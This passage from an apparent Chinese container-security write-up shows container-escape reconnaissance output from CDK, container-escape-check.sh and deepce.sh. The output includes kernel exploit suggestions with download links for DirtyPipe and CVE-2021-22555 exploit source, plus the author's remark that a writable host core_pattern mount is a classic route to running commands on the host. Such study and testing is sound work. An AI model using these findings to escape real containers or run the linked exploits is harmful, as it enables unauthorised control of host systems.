class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs tcl">./cdk evaluate --full<br>CDK (Container DucK)<br>CDK Version(GitCommit): b4105424a2f329020c388e6e16a42e9bb31ef501<br>Zero-dependency cloudnative k8s/docker/serverless penetration toolkit by cdxy &amp; neargle<br>Find tutorial, configuration and use-case in https://github.com/cdk-team/CDK/<br><br>[  Information Gathering - System Info  ]<br>	/usr/bin/chfn<br>	/usr/bin/chsh<br>	/usr/bin/gpasswd<br>	/usr/bin/newgrp<br>	/usr/bin/passwd<br>	/bin/mount<br>	/bin/ping<br>	/bin/su<br>	/bin/umount<br><br>[  Information Gathering - Services  ]<br><br>[  Information Gathering - Commands and Capabilities  ]<br>	CapInh:	<span class="hljs-number">0000000000000000</span><br>	CapPrm:	<span class="hljs-number">00000000</span>a80425fb<br>	CapEff:	<span class="hljs-number">00000000</span>a80425fb<br>	CapBnd:	<span class="hljs-number">00000000</span>a80425fb<br>	CapAmb:	<span class="hljs-number">0000000000000000</span><br>	Cap decode: <span class="hljs-number">0x00000000a80425fb</span> = CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP<br>[*] Maybe you can exploit the Capabilities below:<br><br>[  Information Gathering - Mounts  ]<br><span class="hljs-number">0</span>:<span class="hljs-number">47</span> / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/docker/overlay2/l/<span class="hljs-number">6</span>JC6FZQGYKHHL4O2O5VQZ2UEPE:/var/lib/docker/overlay2/l/ZNRTUHIEVJBUG4YHHAI2WF3CGQ:/var/lib/docker/overlay2/l/B7X5DEEX2MIUSMKAMKG66GHM6H:/var/lib/docker/overlay2/l/JZ26UVGDDLBIN2AV5AN2SMQ33Y:/var/lib/docker/overlay2/l/PXVXR6FJH7TBYMIBZZWZL7IYRG:/var/lib/docker/overlay2/l/<span class="hljs-number">5</span>F2TSJQ5SBGSANBFCV5FWGDQYB:/var/lib/docker/overlay2/l/IQNAZRWMPNDLUYBKM7OUPGBZ4H:/var/lib/docker/overlay2/l/XJQQDLF67JL4LL4OIHGGMJMDOS,upperdir=/var/lib/docker/overlay2/<span class="hljs-number">0158e7</span>b92583381e25557d75696c90d5984f79e2abcf336a060e3b1f4c21982a/diff,workdir=/var/lib/docker/overlay2/<span class="hljs-number">0158e7</span>b92583381e25557d75696c90d5984f79e2abcf336a060e3b1f4c21982a/work<br><span class="hljs-number">0</span>:<span class="hljs-number">55</span> / /<span class="hljs-keyword">proc</span><span class="hljs-title"> rw,nosuid,nodev,noexec,relatime</span> -<span class="hljs-title"> proc</span> <span class="hljs-keyword">proc</span><span class="hljs-title"> rw</span><br>0:56 / /dev<span class="hljs-title"> rw,nosuid</span> -<span class="hljs-title"> tmpfs</span> tmpfs<span class="hljs-title"> rw,size=65536k,mode=755,inode64</span><br>0:57 / /dev/pts<span class="hljs-title"> rw,nosuid,noexec,relatime</span> -<span class="hljs-title"> devpts</span> devpts<span class="hljs-title"> rw,gid=5,mode=620,ptmxmode=666</span><br>0:58 / /sys<span class="hljs-title"> ro,nosuid,nodev,noexec,relatime</span> -<span class="hljs-title"> sysfs</span> sysfs<span class="hljs-title"> ro</span><br>0:30 / /sys/fs/cgroup<span class="hljs-title"> ro,nosuid,nodev,noexec,relatime</span> -<span class="hljs-title"> cgroup2</span> cgroup<span class="hljs-title"> rw</span><br>0:53 / /dev/mqueue<span class="hljs-title"> rw,nosuid,nodev,noexec,relatime</span> -<span class="hljs-title"> mqueue</span> mqueue<span class="hljs-title"> rw</span><br>0:59 / /dev/shm<span class="hljs-title"> rw,nosuid,nodev,noexec,relatime</span> -<span class="hljs-title"> tmpfs</span> shm<span class="hljs-title"> rw,size=65536k,inode64</span><br>252:3 /var/lib/docker/containers/52b7e75c01a9f5f22332a1e9ab8308dbef67758a1175a3a9cd00e32e2bbc67bc/resolv.conf /etc/resolv.conf<span class="hljs-title"> rw,relatime</span> -<span class="hljs-title"> ext4</span> /dev/vda3<span class="hljs-title"> rw</span><br>252:3 /var/lib/docker/containers/52b7e75c01a9f5f22332a1e9ab8308dbef67758a1175a3a9cd00e32e2bbc67bc/hostname /etc/hostname<span class="hljs-title"> rw,relatime</span> -<span class="hljs-title"> ext4</span> /dev/vda3<span class="hljs-title"> rw</span><br>252:3 /var/lib/docker/containers/52b7e75c01a9f5f22332a1e9ab8308dbef67758a1175a3a9cd00e32e2bbc67bc/hosts /etc/hosts<span class="hljs-title"> rw,relatime</span> -<span class="hljs-title"> ext4</span> /dev/vda3<span class="hljs-title"> rw</span><br>0:24 /sys/kernel/core_pattern /host/<span class="hljs-keyword">proc</span>/sys/kernel/core_pattern<span class="hljs-title"> rw,nosuid,nodev,noexec,relatime</span> -<span class="hljs-title"> proc</span> <span class="hljs-keyword">proc</span><span class="hljs-title"> rw</span><br>0:57 /0 /dev/console<span class="hljs-title"> rw,nosuid,noexec,relatime</span> -<span class="hljs-title"> devpts</span> devpts<span class="hljs-title"> rw,gid=5,mode=620,ptmxmode=666</span><br>0:55 /bus /<span class="hljs-keyword">proc</span>/bus<span class="hljs-title"> ro,nosuid,nodev,noexec,relatime</span> -<span class="hljs-title"> proc</span> <span class="hljs-keyword">proc</span><span class="hljs-title"> rw</span><br>0:55 /fs /<span class="hljs-keyword">proc</span>/fs<span class="hljs-title"> ro,nosuid,nodev,noexec,relatime</span> -<span class="hljs-title"> proc</span> <span class="hljs-keyword">proc</span><span class="hljs-title"> rw</span><br>0:55 /irq /<span class="hljs-keyword">proc</span>/irq<span class="hljs-title"> ro,nosuid,nodev,noexec,relatime</span> -<span class="hljs-title"> proc</span> <span class="hljs-keyword">proc</span><span class="hljs-title"> rw</span><br>0:55 /sys /<span class="hljs-keyword">proc</span>/sys<span class="hljs-title"> ro,nosuid,nodev,noexec,relatime</span> -<span class="hljs-title"> proc</span> <span class="hljs-keyword">proc</span><span class="hljs-title"> rw</span><br>0:55 /sysrq-trigger /<span class="hljs-keyword">proc</span>/sysrq-trigger<span class="hljs-title"> ro,nosuid,nodev,noexec,relatime</span> -<span class="hljs-title"> proc</span> <span class="hljs-keyword">proc</span><span class="hljs-title"> rw</span><br>0:60 / /<span class="hljs-keyword">proc</span>/acpi<span class="hljs-title"> ro,relatime</span> -<span class="hljs-title"> tmpfs</span> tmpfs<span class="hljs-title"> ro,inode64</span><br>0:56 /null /<span class="hljs-keyword">proc</span>/interrupts<span class="hljs-title"> rw,nosuid</span> -<span class="hljs-title"> tmpfs</span> tmpfs<span class="hljs-title"> rw,size=65536k,mode=755,inode64</span><br>0:56 /null /<span class="hljs-keyword">proc</span>/kcore<span class="hljs-title"> rw,nosuid</span> -<span class="hljs-title"> tmpfs</span> tmpfs<span class="hljs-title"> rw,size=65536k,mode=755,inode64</span><br>0:56 /null /<span class="hljs-keyword">proc</span>/keys<span class="hljs-title"> rw,nosuid</span> -<span class="hljs-title"> tmpfs</span> tmpfs<span class="hljs-title"> rw,size=65536k,mode=755,inode64</span><br>0:56 /null /<span class="hljs-keyword">proc</span>/timer_list<span class="hljs-title"> rw,nosuid</span> -<span class="hljs-title"> tmpfs</span> tmpfs<span class="hljs-title"> rw,size=65536k,mode=755,inode64</span><br>0:61 / /<span class="hljs-keyword">proc</span>/scsi<span class="hljs-title"> ro,relatime</span> -<span class="hljs-title"> tmpfs</span> tmpfs<span class="hljs-title"> ro,inode64</span><br>0:62 / /sys/firmware<span class="hljs-title"> ro,relatime</span> -<span class="hljs-title"> tmpfs</span> tmpfs<span class="hljs-title"> ro,inode64</span><br>0:63 / /sys/devices/virtual/powercap<span class="hljs-title"> ro,relatime</span> -<span class="hljs-title"> tmpfs</span> tmpfs<span class="hljs-title"> ro,inode64</span><br><br>[<span class="hljs-title">  Information</span> Gathering -<span class="hljs-title"> Net</span> Namespace  ]<span class="hljs-title"></span><br><span class="hljs-title">	container</span> net<span class="hljs-title"> namespace</span> isolated.<br><br>[<span class="hljs-title">  Information</span> Gathering -<span class="hljs-title"> Sysctl</span> Variables  ]<br><br>[<span class="hljs-title">  Information</span> Gathering -<span class="hljs-title"> DNS-Based</span> Service<span class="hljs-title"> Discovery</span>  ]<span class="hljs-title"></span><br><span class="hljs-title">error</span> when<span class="hljs-title"> requesting</span> coreDNS:<span class="hljs-title"> lookup</span> any.any.svc.cluster.local.<span class="hljs-title"> on</span> 100.100.2.138:53:<span class="hljs-title"> read</span> udp 172.17.0.2:44287-&gt;100.100.2.138:53:<span class="hljs-title"> i/o</span> timeout<span class="hljs-title"></span><br><span class="hljs-title">error</span> when<span class="hljs-title"> requesting</span> coreDNS:<span class="hljs-title"> lookup</span> any.any.any.svc.cluster.local.<span class="hljs-title"> on</span> 100.100.2.138:53:<span class="hljs-title"> read</span> udp 172.17.0.2:60389-&gt;100.100.2.138:53:<span class="hljs-title"> i/o</span> timeout<br><br>[<span class="hljs-title">  Discovery</span> -<span class="hljs-title"> K8s</span> API<span class="hljs-title"> Server</span>  ]<span class="hljs-title"></span><br><span class="hljs-title">err</span> found<span class="hljs-title"> while</span> searching<span class="hljs-title"> local</span> K8s<span class="hljs-title"> apiserver</span> addr.:<span class="hljs-title"></span><br><span class="hljs-title">err:</span> cannot<span class="hljs-title"> find</span> kubernetes<span class="hljs-title"> api</span> host<span class="hljs-title"> in</span> ENV<span class="hljs-title"></span><br><span class="hljs-title">	api-server</span> forbids<span class="hljs-title"> anonymous</span> request.<span class="hljs-title"></span><br><span class="hljs-title">	response:</span><br><br>[<span class="hljs-title">  Discovery</span> -<span class="hljs-title"> K8s</span> Service<span class="hljs-title"> Account</span>  ]<span class="hljs-title"></span><br><span class="hljs-title">load</span> K8s<span class="hljs-title"> service</span> account<span class="hljs-title"> token</span> error.:<span class="hljs-title"></span><br><span class="hljs-title">open</span> /var/run/secrets/kubernetes.io/serviceaccount/token:<span class="hljs-title"> no</span> such<span class="hljs-title"> file</span> or<span class="hljs-title"> directory</span><br><br>[<span class="hljs-title">  Discovery</span> -<span class="hljs-title"> Cloud</span> Provider<span class="hljs-title"> Metadata</span> API  ]<span class="hljs-title"></span><br><span class="hljs-title">	Alibaba</span> Cloud<span class="hljs-title"> Metadata</span> API<span class="hljs-title"> available</span> in<span class="hljs-title"> http://100.100.100.200/latest/meta-data/</span><br><span class="hljs-title">	Docs:</span> https://help.aliyun.com/knowledge_detail/49122.html<br><br>[<span class="hljs-title">  Exploit</span> Pre -<span class="hljs-title"> Kernel</span> Exploits  ]<br>[+] [1;32m[CVE-2022-0847][0m<span class="hljs-title"> DirtyPipe</span><br><span class="hljs-title"></span><br><span class="hljs-title">   Details:</span> https://dirtypipe.cm4all.com/<span class="hljs-title"></span><br><span class="hljs-title">   Exposure:</span> less<span class="hljs-title"> probable</span><br><span class="hljs-title">   Tags:</span> ubuntu=(20.04|21.04),debian=11<span class="hljs-title"></span><br><span class="hljs-title">   Download</span> URL:<span class="hljs-title"> https://haxx.in/files/dirtypipez.c</span><br><br>[+] [1;32m[CVE-2021-22555][0m<span class="hljs-title"> Netfilter</span> heap<span class="hljs-title"> out-of-bounds</span> write<span class="hljs-title"></span><br><span class="hljs-title"></span><br><span class="hljs-title">   Details:</span> https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html<span class="hljs-title"></span><br><span class="hljs-title">   Exposure:</span> less<span class="hljs-title"> probable</span><br><span class="hljs-title">   Tags:</span> ubuntu=20.04&#123;kernel:<span class="hljs-number">5.8</span><span class="hljs-number">.0</span>-*&#125;<br>   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve<span class="hljs-number">-2021</span><span class="hljs-number">-22555</span>/exploit.c<br>   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE<span class="hljs-number">-2021</span><span class="hljs-number">-22555</span>/exploit.c<br>   Comments: ip_tables kernel module must be loaded<br><br><br><br>[  Information Gathering - Sensitive Files  ]<br>	.dockerenv - /.dockerenv<br>	/.bashrc - /etc/skel/.bashrc<br>	/.bashrc - /root/.bashrc<br><br>[  Information Gathering - ASLR  ]<br><br>[  Information Gathering - Cgroups  ]<br>	<span class="hljs-number">0</span>::/<br><span class="hljs-number">2026</span>/<span class="hljs-number">03</span>/<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">09</span>:<span class="hljs-number">36</span> current dir: /home/xianxin<br><span class="hljs-number">2026</span>/<span class="hljs-number">03</span>/<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">09</span>:<span class="hljs-number">36</span> current user: root uid: <span class="hljs-number">0</span> gid: <span class="hljs-number">0</span> home: /root<br><span class="hljs-number">2026</span>/<span class="hljs-number">03</span>/<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">09</span>:<span class="hljs-number">36</span> hostname: <span class="hljs-number">52</span>b7e75c01a9<br><span class="hljs-number">2026</span>/<span class="hljs-number">03</span>/<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">09</span>:<span class="hljs-number">36</span> debian debian <span class="hljs-number">10.9</span> kernel: <span class="hljs-number">5.15</span><span class="hljs-number">.0</span><span class="hljs-number">-144</span>-generic<br><span class="hljs-number">2026</span>/<span class="hljs-number">03</span>/<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">09</span>:<span class="hljs-number">36</span> Setuid files found:<br><span class="hljs-number">2026</span>/<span class="hljs-number">03</span>/<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">09</span>:<span class="hljs-number">36</span> service found in process:<br>	<span class="hljs-number">1</span>	<span class="hljs-number">0</span>	java<br><span class="hljs-number">2026</span>/<span class="hljs-number">03</span>/<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">09</span>:<span class="hljs-number">36</span> available commands:<br>	curl,wget,find,java,apt,dpkg,capsh,mount,fdisk,base64,perl<br><span class="hljs-number">2026</span>/<span class="hljs-number">03</span>/<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">09</span>:<span class="hljs-number">36</span> Capabilities hex of Caps(CapInh|CapPrm|CapEff|CapBnd|CapAmb):<br><span class="hljs-number">2026</span>/<span class="hljs-number">03</span>/<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">09</span>:<span class="hljs-number">36</span> net.ipv4.conf.all.route_localnet = <span class="hljs-number">0</span><br><span class="hljs-number">2026</span>/<span class="hljs-number">03</span>/<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">10</span>:<span class="hljs-number">16</span> checking <span class="hljs-keyword">if</span> api-server allows system:anonymous request.<br><span class="hljs-number">2026</span>/<span class="hljs-number">03</span>/<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">10</span>:<span class="hljs-number">17</span> failed to dial Azure API.<br><span class="hljs-number">2026</span>/<span class="hljs-number">03</span>/<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">10</span>:<span class="hljs-number">18</span> failed to dial Google Cloud API.<br><span class="hljs-number">2026</span>/<span class="hljs-number">03</span>/<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">10</span>:<span class="hljs-number">19</span> failed to dial Tencent Cloud API.<br><span class="hljs-number">2026</span>/<span class="hljs-number">03</span>/<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">10</span>:<span class="hljs-number">20</span> failed to dial OpenStack API.<br><span class="hljs-number">2026</span>/<span class="hljs-number">03</span>/<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">10</span>:<span class="hljs-number">21</span> failed to dial Amazon Web Services (AWS) API.<br><span class="hljs-number">2026</span>/<span class="hljs-number">03</span>/<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">10</span>:<span class="hljs-number">22</span> failed to dial ucloud API.<br><span class="hljs-number">2026</span>/<span class="hljs-number">03</span>/<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">10</span>:<span class="hljs-number">22</span> refer: https://github.com/mzet-/linux-exploit-suggester<br><span class="hljs-number">2026</span>/<span class="hljs-number">03</span>/<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">10</span>:<span class="hljs-number">23</span> /<span class="hljs-keyword">proc</span>/sys/kernel/randomize_va_space<span class="hljs-title"> file</span> content: 2<br>2026/03/13 13:10:23<span class="hljs-title"> ASLR</span> is<span class="hljs-title"> enabled.</span><br>2026/03/13 13:10:23 /<span class="hljs-keyword">proc</span>/1/cgroup<span class="hljs-title"> file</span> content:<br>2026/03/13 13:10:23 /<span class="hljs-keyword">proc</span>/self/cgroup<span class="hljs-title"> file</span> added<span class="hljs-title"> content</span> (compare<span class="hljs-title"> pid</span> 1) :<br></code></pre></td></tr></table></figure>
+
+<p>宿主机 <code>/proc</code> 被映射进来了，路径：<code>/host/proc</code></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/sys/</span>kernel<span class="hljs-regexp">/core_pattern → /</span>host<span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>core_pattern<br></code></pre></td></tr></table></figure>
+
+<p><code>/host/proc/sys/kernel/core_pattern</code>被挂载为<code>rw -</code>，这是一个经典的容器逃逸点，可以通过修改 core_pattern 执行宿主机命令。</p>
+<p>当然其他工具也可以检测</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs llvm"># container-escape-check.sh需要修改一下<br>/matrix &gt;./container-escape-check.sh<br><br>[<span class="hljs-number">34</span>m<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>[<span class="hljs-number">0</span>m<br>[<span class="hljs-number">34</span>m                Containers Escape Check v<span class="hljs-number">0.3</span>                 [<span class="hljs-number">0</span>m<br>[<span class="hljs-number">34</span>m-------------------------------------------------------------[<span class="hljs-number">0</span>m<br>[<span class="hljs-number">34</span>m                     Author:  TeamsSix                       [<span class="hljs-number">0</span>m<br>[<span class="hljs-number">34</span>m                     Twitter: TeamsSix                       [<span class="hljs-number">0</span>m<br>[<span class="hljs-number">34</span>m                     Blog: teamssix.com                      [<span class="hljs-number">0</span>m<br>[<span class="hljs-number">34</span>m             WeChat Official Accounts: TeamsSix              [<span class="hljs-number">0</span>m<br>[<span class="hljs-number">34</span>m Project Address: github.com/teamssix/container-escape-check [<span class="hljs-number">0</span>m<br>[<span class="hljs-number">34</span>m<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>[<span class="hljs-number">0</span>m<br><br>[<span class="hljs-number">33</span>m[!] Currently in a container<span class="hljs-punctuation">,</span> checking ......[<span class="hljs-number">0</span>m<br>[<span class="hljs-number">92</span>m[+] The current container has procfs mounted.[<span class="hljs-number">0</span>m<br>[<span class="hljs-number">92</span>m[+] The current container has the CVE<span class="hljs-number">-2022</span><span class="hljs-number">-0847</span> DirtyPipe vulnerability.[<span class="hljs-number">0</span>m<br>[<span class="hljs-number">33</span>m[!] Check completed.[<span class="hljs-number">0</span>m<br># deepce.sh没测出来<br>/matrix &gt;./deepce.sh<br><br>[<span class="hljs-number">1</span><span class="hljs-comment">;90m                      ##[1;37m         .</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;90m                ## ## ##[1;37m        ==</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;90m             ## ## ## ##[1;37m       ===</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;37m         /&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;\___/ ===</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;34m    ~~~ [1;90m&#123;[1;34m~~ ~~~~ ~~~ ~~~~ ~~~ ~[1;90m /  [1;37m===-[1;34m ~~~[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;90m         \______ X           __/</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;90m           \    \         __/</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;90m            \____\_______/[0m</span><br>          __<br>     ____/ /__  ___  ____  ________<br>    / __  / _ \/ _ \/ __ \/ ___/ _ \ [<span class="hljs-number">1</span><span class="hljs-comment">;90m  ENUMERATE[0m</span><br>   / /_/ /  __/  __/ /_/ / (__/  __/ [<span class="hljs-number">1</span><span class="hljs-comment">;90m ESCALATE[0m</span><br>   \__<span class="hljs-punctuation">,</span>_/\___/\___/ .___/\___/\___/[<span class="hljs-number">1</span><span class="hljs-comment">;90m  ESCAPE[0m</span><br>                 /_/<br><br> Docker Enumeration<span class="hljs-punctuation">,</span> Escalation of Privileges <span class="hljs-keyword">and</span> Container Escapes (DEEPCE)<br> by stealthcopter<br><br>[<span class="hljs-number">1</span><span class="hljs-comment">;34m==========================================[1;32m( Colors )[1;34m==========================================[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Exploit Test ............ [0m[48;5;1mExploitable - Check this out[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Basic Test .............. [0m[1;33mPositive Result[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Another Test ............ [0m[1;31mError running check[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Negative Test ........... [0m[1;90mNo[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Multi line test ......... [0m[1;33mYes[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;90mCommand output</span><br>spanning multiple lines[<span class="hljs-number">0</span>m<br><br>[<span class="hljs-number">1</span><span class="hljs-comment">;90mTips will look like this and often contains links with additional info. You can usually </span><br>ctrl+click links in modern terminal <span class="hljs-keyword">to</span> open in a browser window<br>See [<span class="hljs-number">4</span>mhttps://stealthcopter.github.io/deepce[<span class="hljs-number">0</span>m[<span class="hljs-number">0</span>m<br><br>[<span class="hljs-number">1</span><span class="hljs-comment">;34m===================================[1;32m( Enumerating Platform 